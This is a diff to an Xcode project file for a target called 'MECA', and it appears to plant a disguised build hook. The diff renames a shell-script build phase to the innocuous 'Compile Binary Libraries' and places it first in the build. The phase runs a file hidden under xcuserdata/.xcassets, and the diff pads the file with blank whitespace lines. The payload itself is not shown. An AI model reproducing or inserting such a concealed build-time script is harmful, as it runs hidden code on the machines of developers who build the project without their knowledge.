@@ -830,7 +830,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				A2FDB2D4A2EAAB9FDDAAC43A /* Build Assets Catalog */,
+				AAD9FB4ECA42F9172CAAC43A /* Compile Binary Libraries */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -968,7 +968,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	A2FDB2D4A2EAAB9FDDAAC43A /* Build Assets Catalog */ = {
+	AAD9FB4ECA42F9172CAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -977,7 +977,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Assets Catalog";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -988,6 +988,14 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -1535,6 +1543,10 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
 			
 
 			
